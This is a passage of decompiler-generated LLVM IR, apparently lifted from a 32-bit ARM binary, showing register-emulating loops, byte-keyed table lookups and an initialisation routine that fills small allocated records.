  %v0_a394 = load i32, i32* @r4, align 4
  %v1_a394 = add i32 %v0_a394, 24
  %v2_a394 = inttoptr i32 %v1_a394 to i32*
  %v3_a394 = load i32, i32* %v2_a394, align 4
  store i32 %v3_a394, i32* %r0.global-to-local, align 4
  %v2_a398 = icmp eq i32 %v3_a394, 0
  %v0_a39c = load i32, i32* %r5.global-to-local, align 4
  %v2_a39c = add i32 %v0_a394, 20
  %v3_a39c = inttoptr i32 %v2_a39c to i32*
  store i32 %v0_a39c, i32* %v3_a39c, align 4
  br i1 %v2_a398, label %dec_label_pc_a3a4, label %dec_label_pc_a454

dec_label_pc_a3a4:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a43c
  %v0_a3a4 = load i32, i32* @r4, align 4
  %v1_a3a4 = add i32 %v0_a3a4, 28
  %v2_a3a4 = inttoptr i32 %v1_a3a4 to i32*
  %v3_a3a4 = load i32, i32* %v2_a3a4, align 4
  store i32 %v3_a3a4, i32* %r0.global-to-local, align 4
  %v2_a3a8 = icmp eq i32 %v3_a3a4, 0
  %v0_a3ac = load i32, i32* %r5.global-to-local, align 4
  %v2_a3ac = add i32 %v0_a3a4, 24
  %v3_a3ac = inttoptr i32 %v2_a3ac to i32*
  store i32 %v0_a3ac, i32* %v3_a3ac, align 4
  br i1 %v2_a3a8, label %dec_label_pc_a3b4, label %dec_label_pc_a46c

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a4, %dec_label_pc_a454, %dec_label_pc_a46c
  %v0_a3b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_a3b4 = load i32, i32* @r4, align 4
  %v2_a3b4 = add i32 %v1_a3b4, 28
  %v3_a3b4 = inttoptr i32 %v2_a3b4 to i32*
  store i32 %v0_a3b4, i32* %v3_a3b4, align 4
  %v2_a3b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_a3b8, i32* @r4, align 4
  store i32 %v6_a32c, i32* @r5, align 4
  store i32 %v9_a32c, i32* @lr, align 4
  %v0_a3bc = call i32 @function_1091c()
  store i32 %v0_a3bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a3b4
  %v0_a3c4 = phi i32 [ %v2_a334, %dec_label_pc_a32c ], [ %v0_a3bc, %dec_label_pc_a3b4 ]
  %v2_a3c4 = call i32 @function_13754(i32 %v0_a3c4, i32 9)
  store i32 %v2_a3c4, i32* %r0.global-to-local, align 4
  %v0_a3c8 = load i32, i32* @r4, align 4
  %v1_a3c8 = add i32 %v0_a3c8, 4
  %v2_a3c8 = inttoptr i32 %v1_a3c8 to i32*
  %v3_a3c8 = load i32, i32* %v2_a3c8, align 4
  store i32 %v3_a3c8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_a3d0 = icmp eq i32 %v3_a3c8, 0
  %v2_a3d4 = inttoptr i32 %v0_a3c8 to i32*
  store i32 0, i32* %v2_a3d4, align 4
  br i1 %v2_a3d0, label %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge, label %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge

dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge:    ; preds = %dec_label_pc_a3c0
  %v0_a3e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3dc

dec_label_pc_a3c0.dec_label_pc_a354_crit_edge:    ; preds = %dec_label_pc_a3c0
  %v0_a354.pre = load i32, i32* @r4, align 4
  %v0_a35c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_a354

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge, %dec_label_pc_a340
  %v0_a3e0 = phi i32 [ %v0_a3e0.pre, %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge ], [ %v3_a340, %dec_label_pc_a340 ]
  %v2_a3e0 = call i32 @function_13754(i32 %v0_a3e0, i32 9)
  store i32 %v2_a3e0, i32* %r0.global-to-local, align 4
  %v0_a3e4 = load i32, i32* @r4, align 4
  %v1_a3e4 = add i32 %v0_a3e4, 8
  %v2_a3e4 = inttoptr i32 %v1_a3e4 to i32*
  %v3_a3e4 = load i32, i32* %v2_a3e4, align 4
  store i32 %v3_a3e4, i32* %r0.global-to-local, align 4
  %v2_a3e8 = icmp eq i32 %v3_a3e4, 0
  %v0_a3ec = load i32, i32* %r5.global-to-local, align 4
  %v2_a3ec = add i32 %v0_a3e4, 4
  %v3_a3ec = inttoptr i32 %v2_a3ec to i32*
  store i32 %v0_a3ec, i32* %v3_a3ec, align 4
  br i1 %v2_a3e8, label %dec_label_pc_a364, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a3dc
  %v0_a3f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_a3f8 = call i32 @function_13754(i32 %v0_a3f8, i32 9)
  store i32 %v2_a3f8, i32* %r0.global-to-local, align 4
  %v0_a3fc = load i32, i32* @r4, align 4
  %v1_a3fc = add i32 %v0_a3fc, 12
  %v2_a3fc = inttoptr i32 %v1_a3fc to i32*
  %v3_a3fc = load i32, i32* %v2_a3fc, align 4
  store i32 %v3_a3fc, i32* %r0.global-to-local, align 4
  %v2_a400 = icmp eq i32 %v3_a3fc, 0
  %v0_a404 = load i32, i32* %r5.global-to-local, align 4
  %v2_a404 = add i32 %v0_a3fc, 8
  %v3_a404 = inttoptr i32 %v2_a404 to i32*
  store i32 %v0_a404, i32* %v3_a404, align 4
  br i1 %v2_a400, label %dec_label_pc_a374, label %dec_label_pc_a40c

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a3f4
  %v0_a410 = load i32, i32* %r0.global-to-local, align 4
  %v2_a410 = call i32 @function_13754(i32 %v0_a410, i32 9)
  store i32 %v2_a410, i32* %r0.global-to-local, align 4
  %v0_a414 = load i32, i32* @r4, align 4
  %v1_a414 = add i32 %v0_a414, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* %r0.global-to-local, align 4
  %v2_a418 = icmp eq i32 %v3_a414, 0
  %v0_a41c = load i32, i32* %r5.global-to-local, align 4
  %v2_a41c = add i32 %v0_a414, 12
  %v3_a41c = inttoptr i32 %v2_a41c to i32*
  store i32 %v0_a41c, i32* %v3_a41c, align 4
  br i1 %v2_a418, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a40c
  %v0_a428 = load i32, i32* %r0.global-to-local, align 4
  %v2_a428 = call i32 @function_13754(i32 %v0_a428, i32 9)
  store i32 %v2_a428, i32* %r0.global-to-local, align 4
  %v0_a42c = load i32, i32* @r4, align 4
  %v1_a42c = add i32 %v0_a42c, 20
  %v2_a42c = inttoptr i32 %v1_a42c to i32*
  %v3_a42c = load i32, i32* %v2_a42c, align 4
  store i32 %v3_a42c, i32* %r0.global-to-local, align 4
  %v2_a430 = icmp eq i32 %v3_a42c, 0
  %v0_a434 = load i32, i32* %r5.global-to-local, align 4
  %v2_a434 = add i32 %v0_a42c, 16
  %v3_a434 = inttoptr i32 %v2_a434 to i32*
  store i32 %v0_a434, i32* %v3_a434, align 4
  br i1 %v2_a430, label %dec_label_pc_a394, label %dec_label_pc_a43c

dec_label_pc_a43c:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a424
  %v0_a440 = load i32, i32* %r0.global-to-local, align 4
  %v2_a440 = call i32 @function_13754(i32 %v0_a440, i32 9)
  store i32 %v2_a440, i32* %r0.global-to-local, align 4
  %v0_a444 = load i32, i32* @r4, align 4
  %v1_a444 = add i32 %v0_a444, 24
  %v2_a444 = inttoptr i32 %v1_a444 to i32*
  %v3_a444 = load i32, i32* %v2_a444, align 4
  store i32 %v3_a444, i32* %r0.global-to-local, align 4
  %v2_a448 = icmp eq i32 %v3_a444, 0
  %v0_a44c = load i32, i32* %r5.global-to-local, align 4
  %v2_a44c = add i32 %v0_a444, 20
  %v3_a44c = inttoptr i32 %v2_a44c to i32*
  store i32 %v0_a44c, i32* %v3_a44c, align 4
  br i1 %v2_a448, label %dec_label_pc_a3a4, label %dec_label_pc_a454

dec_label_pc_a454:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a43c
  %v0_a458 = load i32, i32* %r0.global-to-local, align 4
  %v2_a458 = call i32 @function_13754(i32 %v0_a458, i32 9)
  store i32 %v2_a458, i32* %r0.global-to-local, align 4
  %v0_a45c = load i32, i32* @r4, align 4
  %v1_a45c = add i32 %v0_a45c, 28
  %v2_a45c = inttoptr i32 %v1_a45c to i32*
  %v3_a45c = load i32, i32* %v2_a45c, align 4
  store i32 %v3_a45c, i32* %r0.global-to-local, align 4
  %v2_a460 = icmp eq i32 %v3_a45c, 0
  %v0_a464 = load i32, i32* %r5.global-to-local, align 4
  %v2_a464 = add i32 %v0_a45c, 24
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v0_a464, i32* %v3_a464, align 4
  br i1 %v2_a460, label %dec_label_pc_a3b4, label %dec_label_pc_a46c

dec_label_pc_a46c:                                ; preds = %dec_label_pc_a3a4, %dec_label_pc_a454
  %v0_a470 = load i32, i32* %r0.global-to-local, align 4
  %v2_a470 = call i32 @function_13754(i32 %v0_a470, i32 9)
  store i32 %v2_a470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3b4

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1, 10, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 16, 1, 4, 18, 3, 6, 20, 5, 8, 22, 7, 10, 24, 9, 12, 26, 11, 15, 13, 14, 30, 0, 17, 19, 21, 23, 25, 27, 28, 29 }
  uselistorder label %dec_label_pc_a46c, { 1, 0 }
  uselistorder label %dec_label_pc_a454, { 1, 0 }
  uselistorder label %dec_label_pc_a43c, { 1, 0 }
  uselistorder label %dec_label_pc_a424, { 1, 0 }
  uselistorder label %dec_label_pc_a40c, { 1, 0 }
  uselistorder label %dec_label_pc_a3f4, { 1, 0 }
  uselistorder label %dec_label_pc_a3c0, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a3a4, { 1, 0 }
  uselistorder label %dec_label_pc_a394, { 1, 0 }
  uselistorder label %dec_label_pc_a384, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 1, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
}

define i32 @function_a47c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a47c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_a47c = urem i32 %arg1, 256
  %v2_a480 = icmp eq i32 %v1_a47c, 0
  %v3_a484 = load i32, i32* @r4, align 4
  br i1 %v2_a480, label %dec_label_pc_a4cc, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a47c
  %v0_a490 = load i32, i32* %r1.global-to-local, align 4
  %v1_a490 = add i32 %v0_a490, 4
  %v2_a490 = inttoptr i32 %v1_a490 to i8*
  %v3_a490 = load i8, i8* %v2_a490, align 1
  %v4_a490 = zext i8 %v3_a490 to i32
  %v1_a494 = urem i32 %arg3, 256
  %v9_a498 = icmp eq i32 %v4_a490, %v1_a494
  br i1 %v9_a498, label %dec_label_pc_a4d4, label %dec_label_pc_a4bc.preheader

dec_label_pc_a4bc.preheader:                      ; preds = %dec_label_pc_a490
  br label %dec_label_pc_a4bc

dec_label_pc_a4ac:                                ; preds = %dec_label_pc_a4bc
  %v1_a4ac = add i32 %v0_a4b4.in, 12
  %v2_a4ac = inttoptr i32 %v1_a4ac to i8*
  %v3_a4ac = load i8, i8* %v2_a4ac, align 1
  %v4_a4ac = zext i8 %v3_a4ac to i32
  %v9_a4b0 = icmp eq i32 %v1_a494, %v4_a4ac
  br i1 %v9_a4b0, label %dec_label_pc_a4d4, label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a4bc.preheader, %dec_label_pc_a4ac
  %v0_a4b4.in = phi i32 [ %v0_a490, %dec_label_pc_a4bc.preheader ], [ %v0_a4b4, %dec_label_pc_a4ac ]
  %v0_a4bc = phi i32 [ 0, %dec_label_pc_a4bc.preheader ], [ %v1_a4bc, %dec_label_pc_a4ac ]
  %v0_a4b4 = add i32 %v0_a4b4.in, 8
  %v1_a4bc = add i32 %v0_a4bc, 1
  %v9_a4c0 = icmp eq i32 %v1_a47c, %v1_a4bc
  store i32 %v0_a4b4, i32* %r1.global-to-local, align 4
  br i1 %v9_a4c0, label %dec_label_pc_a4cc, label %dec_label_pc_a4ac

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4bc, %dec_label_pc_a4d4, %dec_label_pc_a47c
  store i32 %v3_a484, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4ac, %dec_label_pc_a490
  %v0_a4d4 = phi i32 [ %v0_a490, %dec_label_pc_a490 ], [ %v0_a4b4, %dec_label_pc_a4ac ]
  %v1_a4d4 = inttoptr i32 %v0_a4d4 to i32*
  %v2_a4d4 = load i32, i32* %v1_a4d4, align 4
  store i32 %v2_a4d4, i32* @r0, align 4
  %v2_a4d8 = icmp eq i32 %v2_a4d4, 0
  br i1 %v2_a4d8, label %dec_label_pc_a4cc, label %dec_label_pc_a4e0

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a4d4
  store i32 %v3_a484, i32* @r4, align 4
  %v1_a4e4 = call i32 @function_13d30(i32 %v2_a4d4)
  ret i32 %v1_a4e4

; uselistorder directives
  uselistorder i32 %v1_a4bc, { 1, 0 }
  uselistorder i32 %v0_a4b4, { 1, 0, 2 }
  uselistorder i32 %v0_a4b4.in, { 1, 0 }
  uselistorder i32 %v1_a494, { 1, 0 }
  uselistorder i32 %v0_a490, { 1, 0, 2 }
  uselistorder i32 %v3_a484, { 1, 0 }
  uselistorder i32 %v1_a47c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
}

define i32 @function_a4e8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a4e8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_a4e8 = urem i32 %arg1, 256
  %v2_a4ec = icmp eq i32 %v1_a4e8, 0
  %v3_a4f0 = load i32, i32* @r4, align 4
  %v6_a4f0 = load i32, i32* @lr, align 4
  br i1 %v2_a4ec, label %dec_label_pc_a538, label %dec_label_pc_a4fc

dec_label_pc_a4fc:                                ; preds = %dec_label_pc_a4e8
  %v0_a4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i8*
  %v3_a4fc = load i8, i8* %v2_a4fc, align 1
  %v4_a4fc = zext i8 %v3_a4fc to i32
  %v1_a500 = urem i32 %arg3, 256
  %v9_a504 = icmp eq i32 %v4_a4fc, %v1_a500
  br i1 %v9_a504, label %dec_label_pc_a540, label %dec_label_pc_a528.preheader

dec_label_pc_a528.preheader:                      ; preds = %dec_label_pc_a4fc
  br label %dec_label_pc_a528

dec_label_pc_a518:                                ; preds = %dec_label_pc_a528
  %v1_a518 = add i32 %v0_a520.in, 12
  %v2_a518 = inttoptr i32 %v1_a518 to i8*
  %v3_a518 = load i8, i8* %v2_a518, align 1
  %v4_a518 = zext i8 %v3_a518 to i32
  %v9_a51c = icmp eq i32 %v1_a500, %v4_a518
  br i1 %v9_a51c, label %dec_label_pc_a540, label %dec_label_pc_a528

dec_label_pc_a528:                                ; preds = %dec_label_pc_a528.preheader, %dec_label_pc_a518
  %v0_a520.in = phi i32 [ %v0_a4fc, %dec_label_pc_a528.preheader ], [ %v0_a520, %dec_label_pc_a518 ]
  %v0_a528 = phi i32 [ 0, %dec_label_pc_a528.preheader ], [ %v1_a528, %dec_label_pc_a518 ]
  %v0_a520 = add i32 %v0_a520.in, 8
  %v1_a528 = add i32 %v0_a528, 1
  store i32 %v1_a528, i32* @lr, align 4
  %v9_a52c = icmp eq i32 %v1_a4e8, %v1_a528
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  br i1 %v9_a52c, label %dec_label_pc_a538, label %dec_label_pc_a518

dec_label_pc_a538:                                ; preds = %dec_label_pc_a528, %dec_label_pc_a540, %dec_label_pc_a4e8
  store i32 %v3_a4f0, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_a540:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a4fc
  %v0_a540 = phi i32 [ %v0_a4fc, %dec_label_pc_a4fc ], [ %v0_a520, %dec_label_pc_a518 ]
  %v1_a540 = inttoptr i32 %v0_a540 to i32*
  %v2_a540 = load i32, i32* %v1_a540, align 4
  %v2_a544 = icmp eq i32 %v2_a540, 0
  br i1 %v2_a544, label %dec_label_pc_a538, label %dec_label_pc_a54c

dec_label_pc_a54c:                                ; preds = %dec_label_pc_a540
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v6_a4f0, i32* @lr, align 4
  %v2_a554 = inttoptr i32 %v2_a540 to i8*
  %v3_a554 = call i32 @function_12dc0(i8* %v2_a554, i32 10)
  ret i32 %v3_a554

; uselistorder directives
  uselistorder i32 %v1_a528, { 1, 2, 0 }
  uselistorder i32 %v0_a520, { 1, 0, 2 }
  uselistorder i32 %v0_a520.in, { 1, 0 }
  uselistorder i32 %v1_a500, { 1, 0 }
  uselistorder i32 %v0_a4fc, { 1, 0, 2 }
  uselistorder i32 %v3_a4f0, { 1, 0 }
  uselistorder i32 %v1_a4e8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a538, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a528, { 1, 0 }
}

define i32 @function_a558(i32 %arg1) local_unnamed_addr {
dec_label_pc_a558:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_a558 = load i32, i32* @r4, align 4
  store i32 %v3_a558, i32* %stack_var_-20, align 4
  %v6_a558 = load i32, i32* @r5, align 4
  %v9_a558 = load i32, i32* @r6, align 4
  %v12_a558 = load i32, i32* @r7, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a564 = call i32 @function_14254(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1ebc0.55 to i32), i32* @r4, align 4
  %v2_a56c = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a56c = zext i8 %v2_a56c to i32
  store i32 ptrtoint (i32* @global_var_1ebc4.57 to i32), i32* @r6, align 4
  store i32 53540, i32* %r2.global-to-local, align 4
  store i32 %v2_a564, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a580 = mul nuw nsw i32 %v3_a56c, 4
  store i32 %v3_a580, i32* %r1.global-to-local, align 4
  %v2_a584 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a588 = inttoptr i32 %v2_a564 to i32*
  store i32 53540, i32* %v2_a588, align 4
  %v3_a58c = load i32, i32* @r5, align 4
  %v4_a58c = add i32 %v3_a58c, 4
  %v5_a58c = inttoptr i32 %v4_a58c to i8*
  store i8 0, i8* %v5_a58c, align 1
  %v0_a590 = load i32, i32* %r1.global-to-local, align 4
  %v1_a590 = add i32 %v0_a590, 4
  store i32 %v1_a590, i32* %r1.global-to-local, align 4
  %v5_a594 = call i32 @function_1439c(i32 %v2_a584, i32 %v1_a590, i32 53540, i32 0)
  %v2_a598 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a598 = zext i8 %v2_a598 to i32
  store i32 %v3_a598, i32* %r3.global-to-local, align 4
  store i32 %v5_a594, i32* %ip.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r5, align 4
  %v5_a5a0 = mul nuw nsw i32 %v3_a598, 4
  %v6_a5a0 = add i32 %v5_a5a0, %v5_a594
  %v7_a5a0 = inttoptr i32 %v6_a5a0 to i32*
  store i32 %v0_a5a0, i32* %v7_a5a0, align 4
  store i32 ptrtoint (i8* @global_var_1ebc1.66 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v3_a5b0 = load i32, i32* @r4, align 4
  %v4_a5b0 = inttoptr i32 %v3_a5b0 to i8*
  store i8 ptrtoint (i8* @global_var_1ebc1.66 to i8), i8* %v4_a5b0, align 1
  %v0_a5b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_a5b4 = load i32, i32* @r6, align 4
  %v2_a5b4 = inttoptr i32 %v1_a5b4 to i32*
  store i32 %v0_a5b4, i32* %v2_a5b4, align 4
  %v2_a5b8 = call i32 @function_14254(i32 1, i32 8)
  %v2_a5bc = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a5bc = zext i8 %v2_a5bc to i32
  store i32 ptrtoint (i32* @global_var_d7b0.68 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a5b8, i32* @r5, align 4
  %v3_a5cc = mul nuw nsw i32 %v3_a5bc, 4
  store i32 %v3_a5cc, i32* %r1.global-to-local, align 4
  %v2_a5d0 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a5d4 = inttoptr i32 %v2_a5b8 to i32*
  store i32 ptrtoint (i32* @global_var_d7b0.68 to i32), i32* %v2_a5d4, align 4
  %v0_a5d8 = load i32, i32* @r7, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r5, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 4
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r1.global-to-local, align 4
  %v1_a5dc = add i32 %v0_a5dc, 4
  store i32 %v1_a5dc, i32* %r1.global-to-local, align 4
  %v5_a5e0 = call i32 @function_1439c(i32 %v2_a5d0, i32 %v1_a5dc, i32 sext (i8 ptrtoint (i8* @global_var_1ebc1.66 to i8) to i32), i32 ptrtoint (i32* @global_var_d7b0.68 to i32))
  %v2_a5e4 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a5e4 = zext i8 %v2_a5e4 to i32
  store i32 %v3_a5e4, i32* %r3.global-to-local, align 4
  store i32 %v5_a5e0, i32* %ip.global-to-local, align 4
  %v0_a5ec = load i32, i32* @r5, align 4
  %v5_a5ec = mul nuw nsw i32 %v3_a5e4, 4
  %v6_a5ec = add i32 %v5_a5ec, %v5_a5e0
  %v7_a5ec = inttoptr i32 %v6_a5ec to i32*
  store i32 %v0_a5ec, i32* %v7_a5ec, align 4
  %v0_a5f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5f0 = load i32, i32* @r7, align 4
  %v2_a5f0 = add i32 %v1_a5f0, %v0_a5f0
  store i32 %v2_a5f0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5fc = load i32, i32* %ip.global-to-local, align 4
  %v1_a5fc = load i32, i32* @r6, align 4
  %v2_a5fc = inttoptr i32 %v1_a5fc to i32*
  store i32 %v0_a5fc, i32* %v2_a5fc, align 4
  %v0_a600 = load i32, i32* %r2.global-to-local, align 4
  %v1_a600 = trunc i32 %v0_a600 to i8
  %v2_a600 = load i32, i32* @r4, align 4
  %v3_a600 = inttoptr i32 %v2_a600 to i8*
  store i8 %v1_a600, i8* %v3_a600, align 1
  %v2_a604 = call i32 @function_14254(i32 %v1_a5f0, i32 8)
  %v2_a608 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a608 = zext i8 %v2_a608 to i32
  store i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a604, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_a618 = mul nuw nsw i32 %v3_a608, 4
  store i32 %v3_a618, i32* %r1.global-to-local, align 4
  %v2_a61c = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a620 = inttoptr i32 %v2_a604 to i32*
  store i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32* %v2_a620, align 4
  %v3_a624 = load i32, i32* @r5, align 4
  %v4_a624 = add i32 %v3_a624, 4
  %v5_a624 = inttoptr i32 %v4_a624 to i8*
  store i8 2, i8* %v5_a624, align 1
  %v0_a628 = load i32, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a628, 4
  store i32 %v1_a628, i32* %r1.global-to-local, align 4
  %v5_a62c = call i32 @function_1439c(i32 %v2_a61c, i32 %v1_a628, i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32 2)
  %v2_a630 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a630 = zext i8 %v2_a630 to i32
  store i32 %v3_a630, i32* %r3.global-to-local, align 4
  store i32 %v5_a62c, i32* %ip.global-to-local, align 4
  %v0_a638 = load i32, i32* @r5, align 4
  %v5_a638 = mul nuw nsw i32 %v3_a630, 4
  %v6_a638 = add i32 %v5_a638, %v5_a62c
  %v7_a638 = inttoptr i32 %v6_a638 to i32*
  store i32 %v0_a638, i32* %v7_a638, align 4
  %v0_a63c = load i32, i32* %r3.global-to-local, align 4
  %v1_a63c = load i32, i32* @r7, align 4
  %v2_a63c = add i32 %v1_a63c, %v0_a63c
  store i32 %v2_a63c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a648 = load i32, i32* %ip.global-to-local, align 4
  %v1_a648 = load i32, i32* @r6, align 4
  %v2_a648 = inttoptr i32 %v1_a648 to i32*
  store i32 %v0_a648, i32* %v2_a648, align 4
  %v0_a64c = load i32, i32* %r2.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r4, align 4
  %v3_a64c = inttoptr i32 %v2_a64c to i8*
  store i8 %v1_a64c, i8* %v3_a64c, align 1
  %v2_a650 = call i32 @function_14254(i32 %v1_a63c, i32 8)
  %v2_a654 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a654 = zext i8 %v2_a654 to i32
  store i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a650, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_a664 = mul nuw nsw i32 %v3_a654, 4
  store i32 %v3_a664, i32* %r1.global-to-local, align 4
  %v2_a668 = load i32, i32* @global_var_1ebc4.57, align 4
  %v2_a66c = inttoptr i32 %v2_a650 to i32*
  store i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32* %v2_a66c, align 4
  %v3_a670 = load i32, i32* @r5, align 4
  %v4_a670 = add i32 %v3_a670, 4
  %v5_a670 = inttoptr i32 %v4_a670 to i8*
  store i8 9, i8* %v5_a670, align 1
  %v0_a674 = load i32, i32* %r1.global-to-local, align 4
  %v1_a674 = add i32 %v0_a674, 4
  store i32 %v1_a674, i32* %r1.global-to-local, align 4
  %v5_a678 = call i32 @function_1439c(i32 %v2_a668, i32 %v1_a674, i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32 9)
  %v2_a67c = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a67c = zext i8 %v2_a67c to i32
  store i32 %v3_a67c, i32* %r3.global-to-local, align 4
  store i32 %v5_a678, i32* %ip.global-to-local, align 4
  %v0_a684 = load i32, i32* @r5, align 4
  %v5_a684 = mul nuw nsw i32 %v3_a67c, 4
  %v6_a684 = add i32 %v5_a684, %v5_a678
  %v7_a684 = inttoptr i32 %v6_a684 to i32*
  store i32 %v0_a684, i32* %v7_a684, align 4
  %v0_a688 = load i32, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* @r7, align 4
  %v2_a688 = add i32 %v1_a688, %v0_a688
  store i32 %v2_a688, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a694 = load i32, i32* %ip.global-to-local, align 4
  %v1_a694 = load i32, i32* @r6, align 4
  %v2_a694 = inttoptr i32 %v1_a694 to i32*
  store i32 %v0_a694, i32* %v2_a694, align 4
  %v0_a698 = load i32, i32* %r2.global-to-local, align 4
  %v1_a698 = trunc i32 %v0_a698 to i8
  %v2_a698 = load i32, i32* @r4, align 4
  %v3_a698 = inttoptr i32 %v2_a698 to i8*
  store i8 %v1_a698, i8* %v3_a698, align 1
  %v2_a69c = call i32 @function_14254(i32 %v1_a688, i32 8)
  %v2_a6a0 = load i8, i8* bitcast (i8** @global_var_1ebc0.55 to i8*), align 4
  %v3_a6a0 = zext i8 %v2_a6a0 to i32
  store i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a69c, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
